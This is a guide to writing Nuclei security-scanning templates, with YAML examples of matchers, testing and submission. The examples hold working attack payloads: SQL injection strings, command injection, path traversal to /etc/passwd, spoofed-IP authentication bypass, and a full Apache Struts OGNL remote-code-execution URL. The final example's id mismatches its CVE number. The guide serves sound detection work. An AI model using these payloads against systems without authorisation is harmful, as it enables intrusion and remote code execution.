# Nuclei Template Creation Guide
**Complete Guide for Writing High-Quality Security Templates**

---

## Getting Started

### **What is a Nuclei Template?**
Nuclei templates are the cornerstone of the Nuclei scanning engine, designed to enable precise and rapid scanning across various protocols like TCP, DNS, HTTP, and more. Templates are YAML-based definitions that describe how to detect security vulnerabilities, misconfigurations, and exposures while ensuring low-to-zero false positives.

> **📖 Official Documentation**: For comprehensive technical details, visit [ProjectDiscovery Template Docs](https://docs.projectdiscovery.io/templates/introduction)

### **Template Structure Overview**
```yaml
id: template-identifier
info:
  name: Human Readable Vulnerability Name
  author: your-github-username,vulnerability-discoverer-handle
  severity: critical|high|medium|low|info
  description: Clear explanation of what this template detects
  reference:
    - https://link-to-vulnerability-details
  classification:
    cve-id: CVE-2024-1234
    cwe-id: CWE-89
  tags: cve,sqli,rce
  metadata:
    verified: true
    shodan-query: 'http.title:"VulnApp"'

http:
  - method: GET
    path:
      - "{{BaseURL}}/vulnerable-endpoint"
    
    matchers:
      - type: word
        words:
          - "vulnerability_indicator"
        part: body
```

---

## Step-by-Step Template Creation

### **Step 1: Research and Understand the Vulnerability**
Before writing any code:
- [ ] Read the original vulnerability disclosure/advisory
- [ ] Understand the root cause and exploitation method
- [ ] Identify unique indicators that prove vulnerability exists
- [ ] Test the vulnerability in a controlled environment
- [ ] Document the vulnerable versions and affected components

### **Step 2: Choose Your Template ID and Info**
```yaml
# Use descriptive, short identifiers
id: apache-struts-ognl-injection  # GOOD - clear and specific
id: vuln-app-rce                  # BAD - too generic

info:
  name: Apache Struts OGNL Code Injection  # Format: "Vendor Product - Vulnerability Type"
  author: your-github-username,original-researcher-handle  # Always credit the discoverer
  severity: critical  # Based on CVSS score and real-world impact
```

### **Step 3: Write Accurate Description and References**
```yaml
info:
  description: |
    Apache Struts 2.x before 2.3.34 and 2.5.x before 2.5.16 suffer from 
    OGNL injection vulnerability that allows remote code execution.
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-057
    - https://nvd.nist.gov/vuln/detail/CVE-2018-11776
    - https://seclists.org/fulldisclosure/2018/Aug/31
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2018-11776
    cwe-id: CWE-94
```

### **Step 4: Add Proper Tags and Metadata**
```yaml
info:
  tags: cve,cve2018,rce,apache,struts,ognl  # Be specific and comprehensive
  metadata:
    verified: true  # Only if you've tested it yourself
    max-request: 1  # Auto-calculated, don't set manually
    shodan-query: 'http.component:"Apache Struts"'
    fofa-query: 'body="struts" && title="Apache"'
```

---

## Writing Effective HTTP Requests

### **Basic HTTP Template Structure**
```yaml
http:
  - method: GET|POST|PUT|DELETE
    path:
      - "{{BaseURL}}/endpoint"        # Dynamic BaseURL variable
      - "{{Hostname}}/another-path"   # Alternative dynamic variable
    
    headers:
      User-Agent: Custom-Agent-String
      Content-Type: application/json
      Origin: https://example.com
    
    body: |
      {"param": "{{payload}}"}
    
    disable-cookie: false  # Cookies reused by default (optional)
    
    matchers-condition: and  # Require ALL matchers to pass
    matchers:
      - type: word
        words:
          - "success_indicator"
        part: body
```

> **📖 Reference**: [HTTP Template Syntax](https://docs.projectdiscovery.io/templates/protocols/http) for complete protocol details

### **Using Variables for Flexibility**
```yaml
variables:
  username: "admin"
  payload: "{{rand_base(8)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/login"
    body: |
      username={{username}}&password={{payload}}
```

---

## Matcher Best Practices

### **🚫 Avoid Weak Matchers**
```yaml
# BAD - Too generic, will match many innocent systems
matchers:
  - type: word
    words:
      - "error"
      - "admin"
      - "login"
    part: body
```

### **✅ Use Strong, Specific Matchers**
```yaml
# GOOD - Specific to the vulnerability
matchers-condition: and
matchers:
  - type: word
    words:
      - "VulnApp Management Console v2.1.0"  # Specific application version
      - "Build 2024.03.15"                   # Specific build
    part: body
    
  - type: status
    status:
      - 200
      
  - type: word
    words:
      - "OGNL_INJECTION_SUCCESS_{{randstr}}"  # Proof of exploitation
      - "java.lang.ProcessBuilder"            # Technical indicator
    part: body
    condition: or  # Any of these proves exploitation
```

### **Multi-Layer Verification Strategy**
```yaml
# Layer 1: Identify the application
# Layer 2: Confirm vulnerable version  
# Layer 3: Prove vulnerability exists
matchers-condition: and
matchers:
  - type: word                    # Layer 1: App identification
    words:
      - "Apache Struts Framework"
      - "struts-tags"
    part: body
    
  - type: regex                   # Layer 2: Version detection
    regex:
      - 'Struts 2\.[0-4]\.[0-9]+'  # Vulnerable version range
    part: body
    
  - type: word                    # Layer 3: Exploitation proof
    words:
      - "ognl.OgnlException"
      - "java.lang.SecurityException"
    part: body
    condition: or
```

---

## Testing Your Template

### **Before Submitting - Test Thoroughly**
```bash
# Test against known vulnerable instance
nuclei -t your-template.yaml -target http://vulnerable-app.local -debug

# Test against patched/non-vulnerable systems
nuclei -t your-template.yaml -target http://patched-app.local -debug

# Test against similar but different applications
nuclei -t your-template.yaml -target http://different-but-similar-app.local -debug
```

### **Validation Checklist**
- [ ] Template detects the vulnerability on vulnerable systems
- [ ] Template does NOT trigger false positives on:
  - [ ] Patched versions of the same application
  - [ ] Similar applications from the same vendor
  - [ ] Generic web frameworks or CMSs
  - [ ] Default server error pages
- [ ] Matchers are specific enough to avoid honeypots
- [ ] References are valid and accessible
- [ ] YAML syntax is correct (`nuclei -validate -t template.yaml`)

---

## Common Vulnerability Types - Template Patterns

### **SQL Injection Detection**
```yaml
http:
  - method: POST
    path:
      - "{{BaseURL}}/search"
    body: "q={{payload}}"
    
    payloads:
      payload:
        - "1' OR '1'='1"
        - "1' UNION SELECT version()--"
        - "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
    
    matchers:
      - type: word
        words:
          - "mysql_fetch_array(): supplied argument"
          - "You have an error in your SQL syntax"
          - "Microsoft OLE DB Provider for ODBC"
        part: body
```

### **Remote Code Execution (RCE)**
```yaml
variables:
  cmd: "whoami"
  marker: "{{rand_base(8)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/execute"
    body: |
      command={{cmd}} && echo {{marker}}
    
    matchers:
      - type: word
        words:
          - "{{marker}}"
        part: body
      - type: regex
        regex:
          - 'root|administrator|www-data'
        part: body
```

### **Local File Inclusion (LFI)**
```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/view?file=../../../etc/passwd"
      - "{{BaseURL}}/view?file=..\\..\\..\\windows\\win.ini"
    
    matchers:
      - type: regex
        regex:
          - 'root:.*?:[0-9]*:[0-9]*:'  # Linux /etc/passwd
          - '\[fonts\]'                 # Windows win.ini
        part: body
```

### **Authentication Bypass**
```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
    headers:
      X-Originating-IP: 127.0.0.1
      X-Forwarded-For: 127.0.0.1
      X-Real-IP: 127.0.0.1
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Admin Dashboard"
          - "Administrative Panel"
        part: body
      - type: status
        status:
          - 200
```

---

## Advanced Template Features

### **Using Extractors for Data Collection**
```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/info"
    
    extractors:
      - type: regex
        name: version
        regex:
          - 'Version: ([0-9\.]+)'
        group: 1
    
    matchers:
      - type: word
        words:
          - "Application Info"
        part: body
```

### **Conditional Logic with DSL**
```yaml
matchers:
  - type: dsl
    dsl:
      - 'status_code == 200'
      - 'contains(body, "vulnerable_pattern")'
      - 'len(body) > 1000'
    condition: and
```

### **Network Templates for Non-HTTP Services**
```yaml
network:
  - inputs:
      - data: "{{hex_decode('474554202f20485454502f312e310d0a0d0a')}}"  # GET / HTTP/1.1
    host:
      - "{{Hostname}}"
    port: 8080
    
    matchers:
      - type: word
        words:
          - "Server: VulnServer/1.0"
        part: data
```

---

## Submission Guidelines

### **Preparing Your Template for Submission**
1. **Validate Syntax**
   ```bash
   nuclei -validate -t your-template.yaml
   ```

2. **Test Thoroughly**
   ```bash
   nuclei -t your-template.yaml -target vulnerable-instance.com -debug
   ```

3. **Check for Existing Templates**
   - Search the repository for similar vulnerabilities
   - Avoid duplicating existing detection logic
   - If improving existing template, explain why

4. **Follow Naming Conventions**
   - Place in appropriate directory (`cves/2024/`, `exposures/`, `misconfiguration/`)
   - Use descriptive filename: `CVE-2024-1234.yaml` or `app-name-vuln-type.yaml`

### **Pull Request Best Practices**
- **Title**: Clear description of what the template detects
- **Description**: Include:
  - Link to vulnerability details/advisory
  - Affected versions
  - Testing methodology
  - Screenshots/proof if possible
- **Testing**: Show debug output proving detection works
- **Test Instances**: If you have a testable self-hosted instance or vulnerable environment that cannot be shared publicly, email templates@projectdiscovery.io
- **References**: Include all relevant security advisories

> **💡 Pro Tip**: Providing a testable vulnerable environment significantly reduces review time and speeds up the template merge process. Reviewers can immediately validate your template instead of setting up their own test environment.

---

## Quality Checklist

### **Before Submitting Your Template**
- [ ] **Functionality**
  - [ ] Template detects the intended vulnerability
  - [ ] No false positives on tested systems
  - [ ] Matchers are specific and accurate
  
- [ ] **Attribution**
  - [ ] Original vulnerability discoverer credited in author field
  - [ ] All references included and valid
  - [ ] Proper CVSS scoring if applicable
  
- [ ] **Quality**
  - [ ] YAML syntax is valid
  - [ ] Follows nuclei template conventions
  - [ ] Includes appropriate tags and metadata
  
- [ ] **Testing**
  - [ ] Tested against vulnerable instance
  - [ ] Tested against non-vulnerable similar systems
  - [ ] Debug output reviewed for accuracy
  
- [ ] **Documentation**
  - [ ] Clear description of what template detects
  - [ ] Proper severity classification
  - [ ] Complete reference list

---

## Examples of High-Quality Templates

### **Complete CVE Template Example**
```yaml
id: CVE-2024-1234-apache-struts-rce

info:
  name: Apache Struts 2.x OGNL Code Injection
  author: your-github-username,original-researcher-handle
  severity: critical
  description: |
    Apache Struts 2.x before 2.3.34 and 2.5.x before 2.5.16 suffer from 
    OGNL injection vulnerability in the namespace value that allows remote 
    code execution.
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-057
    - https://nvd.nist.gov/vuln/detail/CVE-2018-11776
    - https://seclists.org/fulldisclosure/2018/Aug/31
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2018-11776
    cwe-id: CWE-94
  metadata:
    verified: true
    shodan-query: 'http.component:"Apache Struts"'
    fofa-query: 'body="struts" && title="Apache"'
  tags: cve,cve2018,rce,apache,struts,ognl,kev

variables:
  command: "whoami"
  marker: "{{rand_base(8)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{{command}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}/actionChain1.action"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "struts"
          - "java"
        part: body
        condition: or

      - type: regex
        regex:
          - 'root|administrator|www-data|apache'
        part: body
```

---

## Getting Help

### **Resources**
- **Official Documentation**: [ProjectDiscovery Template Docs](https://docs.projectdiscovery.io/templates/introduction)
- **HTTP Templates**: [HTTP Protocol Documentation](https://docs.projectdiscovery.io/templates/protocols/http)
- **AI Template Creation**: [ProjectDiscovery Cloud Templates](https://cloud.projectdiscovery.io/templates) - AI-powered template generation
- **Examples**: Browse existing templates in the [Nuclei Templates Repository](https://github.com/projectdiscovery/nuclei-templates)
- **Community**: Join [ProjectDiscovery Discord](https://discord.gg/projectdiscovery) for questions and discussions
- **Testing**: Use local vulnerable applications for safe testing
- **Test Instances**: Email templates@projectdiscovery.io if you can provide a testable vulnerable environment

> **💡 Pro Tip**: Sharing test instances with reviewers significantly accelerates the template review and merge process.

### **Common Issues and Solutions**
- **False Positives**: Make matchers more specific, add version detection
- **YAML Errors**: Use online YAML validators, check indentation
- **Template Not Triggering**: Verify target is actually vulnerable, check debug output
- **Performance Issues**: Minimize requests, optimize matchers

---

*This guide provides everything needed to create high-quality, accurate nuclei templates that contribute valuable security detection capabilities to the community.*